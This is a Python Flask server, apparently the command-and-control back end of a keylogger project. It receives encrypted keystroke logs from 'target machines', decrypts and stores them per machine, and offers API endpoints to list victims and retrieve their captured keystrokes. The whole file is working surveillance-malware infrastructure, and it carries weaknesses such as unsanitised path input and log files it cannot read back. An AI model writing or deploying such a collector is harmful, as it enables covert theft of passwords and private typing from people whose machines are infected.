import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from flask import Flask, jsonify, request, json
from flask_cors import CORS
import time
from KeyLoggerAgent import encryptor

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")


def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d") + ".txt"


app = Flask('app')
CORS(app)


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    print(data)
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    machine = data["machine"]
    # log_data = data["data"]
    log_data_decrypted = encryptor.Encryptor().decrypt(data["data"])
    print(f"Decrypted data: {log_data_decrypted}")

    machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    with open(file_path, "a", encoding="utf-8") as f:
        new_entry = {
            "timestamp": timestamp,
            "data": log_data_decrypted
        }
        f.write(json.dumps(new_entry, ensure_ascii=False, indent=4, sort_keys=False) + "\n")

    return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_target_machine_key_strokes():
    target_machine = request.args.get('target_machine')
    if not target_machine:
        return jsonify({"error": "Missing target_machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = os.listdir(machine_folder)
    files.sort(reverse=True)
    data = []
    for file in files:
        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
            file_data = json.load(f)
            for key, value in file_data.items():
                for entry in value:
                    data.append(entry)
    return jsonify({"data": data}), 200


@app.route('/api/decrypt_data', methods=['GET'])
def decrypt_data():
    return jsonify({"status": "success"}), 200


if __name__ == '__main__':
    app.run(debug=True)
